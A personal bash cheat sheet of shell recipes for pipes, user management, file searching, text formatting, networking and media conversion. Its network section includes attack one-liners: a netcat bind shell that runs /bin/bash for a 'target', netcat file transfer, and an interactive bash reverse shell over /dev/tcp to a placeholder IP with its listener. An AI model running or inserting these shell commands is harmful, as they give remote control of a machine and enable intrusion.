# bashception

    # print each command and their respective output to stdout and log to file
    bash -x ./script.sh arg1 | tee script.log

# features

    set -m      # enable job control, adds feautures to & (background job): jobs, ctrl+Z, fg, bg
    set -x      # print commands being run

# pipe

    # file descriptors: pointers to the sources of data that the programs are using.
    0   stdin   Standard Input
    1   stdout  Standard Output
    2   stderr  Standard Error

    # send stderr to stdout
    cmd 2>&1 | cat
    cmd >>file.txt 2>&1

    # send to file and stdout
    ls 2>&1 | tee /tmp/ls.txt

    # Command output as file
    diff <(echo "abc") <(echo "abd")

# user

    # rename
    usermod --login new_username old_username

    # rename home folder as well
    usermod -d /home/new_home -m new_usename

    # don't forget to add yourself to groups like of virtualbox
    usermod -aG vboxsf $(whoami)

    # delete a user
    userdel username

    # delete a user and it's home folder
    userdel -r username

    # if a user is running processes you will need to kill them
    killall -u username

    # delete a user and kill of it's processes as well
    userdel -f username

# files

    # disk space
    # Filesystems disk space usage
    df -h
    # estimate directories space usage in [h]uman & [s]ummarized
    du -hs

    # apply a file attributes to b
    touch -r <a> <b>

    # sha1sum check
    echo <hash> <file> | sha1sum -c

    # get filename no extension
    "${pkey%.*}"

# archives

    # create an archive with everything in dir1 and ignore the others ones
    zip -r myarchive.zip dir1/* -x dir1/ignoreDir1/**\* dir1/ignoreDir2/**\*

# ps

    # find processes who are using the files
    find <folder> -print0 | xargs -0 lsof -n

    # findings systemd unit files
    $ systemctl list-unit-files ssh*
    UNIT FILE           STATE    VENDOR PRESET
    sshd.service        disabled disabled
    sshdgenkeys.service static   -

    $ systemctl list-units --all tmp*
    UNIT      LOAD   ACTIVE SUB     DESCRIPTION
    tmp.mount loaded active mounted Temporary Directory /tmp

# finding

    # something inside all directory files
    grep -Rn <word> <dir>

    # execute on all files inside a directory
    find <dir> -type f -execdir <command> {} \;

    # excluding directories
    # Find at / (path1 OR path2) if found dir return True & don't descend (-prune) OR you_data_to_find (rest).
    find / \( -path /sys -o -path /var \) -prune -o -type d -name site-packages

    # get nth line in file
    awk -v n=$MY_VAR 'NR == n' /tmp/file

    # replace strings
    grep -rl matchstring somedir/ | xargs sed -i 's/string1/string2/g'

    # replace filenames
    find . -name *_test.rb | sed -e "p;s/test/spec/" | xargs -n2 mv

    # loop over files with spaces
    find . -type f -name "*.priv" -print0 | while IFS= read -r -d '' file; do echo "$file"; done

    # find all ip addresses
    grep -roE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' .

# formatting

    # make a patch
    diff -Naur file1 file2 > file.patch

    # lines to commas
    cat data.txt | paste -s -d, -

    # convert commas to spaces
    echo "toto,tata" | tr ',' ' '

    # convert new lines to commas
    echo "toto
    tata" | tr '\n' ','

    # remove blank lines
    awk '!/^$/' file

    # combine two columns
    echo "1 2 3" | awk '{print $1"-"$2,$3}'

    # change print order
    echo "1 2 3" | awk '{print $3,$2,$1}'

    # upper to lower case
    echo "AA" | tr '[:upper:]' '[:lower:]'

    # remove head and tail banners
    cat ssh.key | tail -n +2 | head -n -1

    # stip of file count header
    echo "12) Title" | sed 's/[[:digit:]]\+)\s//g'

    # show files omit .exe ones
    ls -l | grep -vE '.exe'

# sorting

    # remove duplicate lines
    awk '!seen[$0]++' filename

    # uniques case independant (lower everything)
    cat file | awk '!arr[tolower($1)]++'

    # unique list based on column 1 and 3 (todo to lower case or different)
    sort -u -t : -k 1,1 -k 3,3 test.txt

    # count file extensions with ls
    tree -L 2 | sed -n 's/..*\.//p' | sort | uniq -c

    # count file extensions with smb ls
    cat smb-recursive-ls.log | grep ' A ' | sed -n 's/..*\.//p' | sed 's/\ .*$//' | sort -u | uniq

# conditions

    # check if command exists
    command=`which mycmd`
    if [ -z "$command" ]; then
        echo "Command not found"
    fi

# functions

    # counter
    echo 0 > /tmp/c; cat /tmp/c
    for i in seq 3 ; do
        i=$(cat /tmp/c) && echo $((i+1)) > /tmp/c && echo $(cat /tmp/c);
    done;

# network

    whois google.com
    dig +short google.com
    nslookup google.com

    tracepath <desitination>

    # network statistics
    Network statistics of upload & download rates
    vnstat -i wlan0

    # mount ssh directory
    sshfs roger@ipaddr:/home/toto /mnt/roger/
    fusermount -u mountpoint # unmount

    # wsharks: capture as non-root
    sudo usermod -a -G wireshark <username>
    sudo chmod 750 /usr/bin/dumpcap
    sudo setcap cap_net_raw,cap_net_admin+eip /usr/bin/dumpcap
    # logout

    # investigate sockets: all, numeric(noresolve), tcp, listen, processes
    ss -antlp

    # create file on target
    nc -vlpn 6666 > mybin

    # execute on target on connect
    nc -vlpn 6666 -e /bin/bash

    # send from source
    nc -vn <ip> 6666 < mybin

    # native /dev/tcp way
    { cat /tmp/toto >&3; cat <&3; } 3<>/dev/tcp/0.0.0.0/42070

    # http get with netcat
    cat <(echo "GET \file.txt HTTP/1.0" && echo) - | nc 1.1.1.1 2222 -vv

    # http get with native /dev/tcp way
    { printf >&3 'GET / HTTP/1.0\r\n\r\n'; cat <&3 } 3<>/dev/tcp/www.google.com/80

    # reverse shell listen
    nc -v -l -p 6666

    # reverse shell interactive bash on tcp:
    # >& (send bash output); 0>&1 (resend stdin to stdout); & (background)
    /bin/bash -i >& /dev/tcp/<ip>/6666 0>&1 &

# multimedia

    # converting with ffmpeg & avconv
    ffmpeg -fflags +genpts -i input.avi -map_metadata 0:s:0 -codec copy -f mp4 output.mp4   # removes metadata
    avconv -i in.webm -c:v libx264 -crf 20 -c:a aac -strict out.mp4

    # download files from url
    wget -r -P <destination> -A jpeg,jpg,bmp,gif,png,webm,webp

    # get open window info
    xprop -root | grep <window id>
    xprop -id <id>

    # pdf pages to images
    pdftoppm input.pdf prefix_name -png -f {page} -singlefile
    pdftoppm input.pdf prefix_name -png

    # bookmarks
    buku -i <file>.html             # import bookmarks
    buku -s <keyword-or-tag>        # search full match
    buku --deep <substring>         # search partial match
    buku -r <regex>                 # search regex
    buku -d <indice>                # delete specific ones
    buku -s <tag> -d                # delete all matched
    buku -d                         # prompt for delete all

# literacy

    # dictionnary
    mkdir -p /usr/share/stardict/dic/
    tar -xvjf downloaded_dictionnary.tar.bz2 -C /usr/share/stardict/dic
    tar -xvzf downlaoded_dictionnary.tar.gz -C /usr/share/stardict/dic
    sdcv word

- http://abloz.com/huzheng/stardict-dic/
- https://web.archive.org/web/20140917131745/
- http://abloz.com/huzheng/stardict-dic/dict.org/
